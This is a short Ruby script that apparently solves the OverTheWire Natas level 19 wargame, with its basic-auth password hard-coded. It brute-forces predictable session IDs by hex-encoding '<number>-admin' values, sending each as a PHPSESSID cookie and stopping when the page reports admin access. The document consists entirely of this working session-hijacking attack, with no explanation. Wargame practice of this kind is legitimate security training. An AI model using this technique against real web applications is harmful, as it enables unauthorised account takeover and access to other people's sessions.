require 'net/http'

print "Attempting: "
641.times do |i|
  attempt = "#{i}-admin".each_byte.map{|b| b.to_s(16)}.join
  print "#{attempt},"
  uri = URI.parse("http://natas19.natas.labs.overthewire.org/index.php")
  http = Net::HTTP.new(uri.host,uri.port)

  header = { 'Cookie' => "PHPSESSID=#{attempt}" }
  req = Net::HTTP::Post.new(uri.path, header)
  req.basic_auth("natas19","4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs")

  resp = http.request(req)
  if resp.body.include?("You are an admin")
    puts resp.body
    break
  end
end
